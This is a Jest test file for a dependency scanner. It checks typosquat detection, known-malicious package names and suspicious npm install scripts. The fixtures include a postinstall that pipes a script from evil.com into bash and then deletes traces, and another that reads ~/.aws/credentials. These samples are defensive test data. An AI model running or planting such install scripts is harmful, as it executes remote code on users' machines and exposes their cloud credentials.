/**
 * Dependency Scanner Tests
 *
 * Tests for the `shieldcortex audit --deps` feature.
 */

import { describe, it, expect, beforeEach, afterEach } from '@jest/globals';
import { mkdirSync, writeFileSync, rmSync, mkdtempSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

import {
  levenshtein,
  scanDependencies,
  resolveNodeModulesPath,
} from '../audit/dependency-scanner.js';

// ── Helpers ──────────────────────────────────────────────────────────────────

function makePackage(
  nodeModules: string,
  name: string,
  pkg: Record<string, unknown>,
): void {
  const parts = name.split('/');
  const dir = join(nodeModules, ...parts);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'package.json'), JSON.stringify(pkg, null, 2));
}

// ── Levenshtein ───────────────────────────────────────────────────────────────

describe('levenshtein()', () => {
  it('returns 0 for identical strings', () => {
    expect(levenshtein('axios', 'axios')).toBe(0);
  });

  it('counts single character substitution', () => {
    expect(levenshtein('axois', 'axios')).toBe(2); // swap 'oi' → 'io' = 2 ops
  });

  it('handles single insertion', () => {
    expect(levenshtein('loadsh', 'lodash')).toBe(2); // two substitutions (a↔d swap); still within typosquat threshold
  });

  it('handles empty strings', () => {
    expect(levenshtein('', 'abc')).toBe(3);
    expect(levenshtein('abc', '')).toBe(3);
    expect(levenshtein('', '')).toBe(0);
  });

  it('handles completely different strings', () => {
    expect(levenshtein('abc', 'xyz')).toBe(3);
  });
});

// ── Known Malicious Packages ─────────────────────────────────────────────────

describe('scanDependencies() — known malicious', () => {
  let tmp: string;
  let nodeModules: string;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), 'sc-test-'));
    nodeModules = join(tmp, 'node_modules');
    mkdirSync(nodeModules);
  });

  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
  });

  it('flags a known malicious package as CRITICAL', () => {
    makePackage(nodeModules, 'plain-crypto-js', {
      name: 'plain-crypto-js',
      version: '1.0.0',
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const finding = result.findings.find(f => f.title.includes('plain-crypto-js'));
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('critical');
  });

  it('flags color-diff-napi as CRITICAL', () => {
    makePackage(nodeModules, 'color-diff-napi', {
      name: 'color-diff-napi',
      version: '1.0.0',
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const criticals = result.findings.filter(f => f.severity === 'critical');
    expect(criticals.length).toBeGreaterThan(0);
  });

  it('does NOT flag a clean legitimate package', () => {
    makePackage(nodeModules, 'chalk', {
      name: 'chalk',
      version: '5.3.0',
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const maliciousFindings = result.findings.filter(
      f => f.severity === 'critical' && f.title.includes('chalk'),
    );
    expect(maliciousFindings).toHaveLength(0);
  });
});

// ── Typosquat Detection ───────────────────────────────────────────────────────

describe('scanDependencies() — typosquat detection', () => {
  let tmp: string;
  let nodeModules: string;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), 'sc-typo-'));
    nodeModules = join(tmp, 'node_modules');
    mkdirSync(nodeModules);
  });

  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
  });

  it('flags "axois" as a typosquat of "axios"', () => {
    makePackage(nodeModules, 'axois', { name: 'axois', version: '1.0.0' });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const finding = result.findings.find(f => f.title.includes('axois') && f.title.includes('axios'));
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('high');
  });

  it('flags "loadsh" as a typosquat of "lodash"', () => {
    makePackage(nodeModules, 'loadsh', { name: 'loadsh', version: '1.0.0' });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const finding = result.findings.find(f => f.title.includes('loadsh') && f.title.includes('lodash'));
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('high');
  });

  it('does NOT flag the exact popular package itself', () => {
    makePackage(nodeModules, 'axios', { name: 'axios', version: '1.7.0' });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const typoFindings = result.findings.filter(
      f => f.title.includes('axios') && f.severity === 'high',
    );
    expect(typoFindings).toHaveLength(0);
  });

  it('does NOT flag a completely unrelated package', () => {
    makePackage(nodeModules, 'zxyz-unique-name-12345', {
      name: 'zxyz-unique-name-12345',
      version: '1.0.0',
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    expect(result.findings).toHaveLength(0);
  });
});

// ── Suspicious Postinstall Scripts ───────────────────────────────────────────

describe('scanDependencies() — suspicious postinstall', () => {
  let tmp: string;
  let nodeModules: string;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), 'sc-post-'));
    nodeModules = join(tmp, 'node_modules');
    mkdirSync(nodeModules);
  });

  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
  });

  it('flags HIGH when 2+ suspicious patterns found in postinstall', () => {
    makePackage(nodeModules, 'bad-pkg', {
      name: 'bad-pkg',
      version: '1.0.0',
      scripts: {
        postinstall: 'curl https://evil.com/payload.sh | bash && rm -rf /tmp/trace',
      },
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const finding = result.findings.find(
      f => f.title.includes('bad-pkg') && f.severity === 'high',
    );
    expect(finding).toBeDefined();
  });

  it('flags MEDIUM when exactly 1 suspicious pattern found', () => {
    makePackage(nodeModules, 'slightly-sus', {
      name: 'slightly-sus',
      version: '1.0.0',
      scripts: {
        postinstall: 'node build.js',
        preinstall: 'node -e "require(\'child_process\')"',
      },
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const finding = result.findings.find(
      f => f.title.includes('slightly-sus'),
    );
    expect(finding).toBeDefined();
    expect(finding?.severity).toBe('medium');
  });

  it('flags credential access pattern (.aws)', () => {
    makePackage(nodeModules, 'cred-stealer', {
      name: 'cred-stealer',
      version: '1.0.0',
      scripts: {
        postinstall: 'node -e "require(\'fs\').readFileSync(process.env.HOME + \'/.aws/credentials\')"',
      },
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const finding = result.findings.find(f => f.title.includes('cred-stealer'));
    expect(finding).toBeDefined();
  });

  it('does NOT flag a clean postinstall script', () => {
    makePackage(nodeModules, 'clean-pkg', {
      name: 'clean-pkg',
      version: '2.0.0',
      scripts: {
        postinstall: 'node scripts/build-bindings.js',
      },
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    // A single non-suspicious script should produce no findings
    const findings = result.findings.filter(f => f.title.includes('clean-pkg'));
    expect(findings).toHaveLength(0);
  });

  it('does NOT flag a package with no install scripts', () => {
    makePackage(nodeModules, 'no-scripts', {
      name: 'no-scripts',
      version: '1.0.0',
      scripts: {
        test: 'jest',
        build: 'tsc',
      },
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    expect(result.findings).toHaveLength(0);
  });
});

// ── Package Age Check ─────────────────────────────────────────────────────────

describe('scanDependencies() — package age check', () => {
  let tmp: string;
  let nodeModules: string;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), 'sc-age-'));
    nodeModules = join(tmp, 'node_modules');
    mkdirSync(nodeModules);
  });

  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
  });

  it('flags a newly published package with postinstall as MEDIUM', () => {
    const yesterday = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
    makePackage(nodeModules, 'brand-new-pkg', {
      name: 'brand-new-pkg',
      version: '1.0.0',
      _time: yesterday,
      scripts: {
        postinstall: 'node setup.js',
      },
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const finding = result.findings.find(
      f => f.title.includes('brand-new-pkg') && f.severity === 'medium',
    );
    expect(finding).toBeDefined();
  });

  it('does NOT flag an old package with postinstall', () => {
    const oldDate = new Date('2023-01-01T00:00:00Z').toISOString();
    makePackage(nodeModules, 'old-pkg', {
      name: 'old-pkg',
      version: '3.0.0',
      _time: oldDate,
      scripts: {
        postinstall: 'node setup.js',
      },
    });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    const ageFindings = result.findings.filter(
      f => f.title.includes('old-pkg') && f.title.includes('Newly published'),
    );
    expect(ageFindings).toHaveLength(0);
  });
});

// ── General Scanner Behaviour ─────────────────────────────────────────────────

describe('scanDependencies() — general', () => {
  it('returns skipped result when node_modules does not exist', () => {
    const result = scanDependencies({ nodeModulesPath: '/nonexistent/node_modules' });
    expect(result.skipped).toBe(true);
    expect(result.findings).toHaveLength(0);
  });

  it('returns correct itemsScanned count', () => {
    const tmp = mkdtempSync(join(tmpdir(), 'sc-count-'));
    const nodeModules = join(tmp, 'node_modules');
    mkdirSync(nodeModules);

    makePackage(nodeModules, 'pkg-a', { name: 'pkg-a', version: '1.0.0' });
    makePackage(nodeModules, 'pkg-b', { name: 'pkg-b', version: '1.0.0' });
    makePackage(nodeModules, 'pkg-c', { name: 'pkg-c', version: '1.0.0' });

    const result = scanDependencies({ nodeModulesPath: nodeModules });
    expect(result.itemsScanned).toBe(3);

    rmSync(tmp, { recursive: true, force: true });
  });
});

// ── resolveNodeModulesPath ────────────────────────────────────────────────────

describe('resolveNodeModulesPath()', () => {
  it('returns cwd/node_modules for local mode', () => {
    const path = resolveNodeModulesPath('local');
    expect(path).toContain('node_modules');
  });

  it('returns custom path when mode is "path"', () => {
    const path = resolveNodeModulesPath('path', '/custom/path/node_modules');
    expect(path).toBe('/custom/path/node_modules');
  });
});
